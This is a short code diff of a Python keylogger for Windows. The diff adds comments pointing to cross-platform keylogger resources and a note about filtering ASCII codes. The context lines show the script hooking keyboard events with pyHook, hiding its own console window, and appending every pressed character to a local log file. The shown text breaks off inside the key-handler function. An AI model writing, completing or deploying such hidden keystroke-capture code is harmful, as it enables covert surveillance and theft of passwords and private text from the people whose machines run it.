@@ -2,7 +2,8 @@
 
 ### http://stackoverflow.com/a/14371067/774163
 ### TODO: THIS HAS A WINDOWS DEPENDENCY!!!!!!!!!!!!
-
+### may want to check out cross-platform loggers
+### http://stackoverflow.com/questions/365110/cross-platform-keylogger
 import pyHook
 import pythoncom
 import win32gui
@@ -13,6 +14,7 @@ log_file = "log_file.txt"                 #name of log file
 window = win32console.GetConsoleWindow()  #go to script window
 win32gui.ShowWindow(window,0)             #hide window
 
+## may want to exclude ascii code 0 and 8
 def pressed_chars(event):       #on key pressed function
     if event.Ascii:
         f = open(log_file,"a")  # (open log_file in append mode)
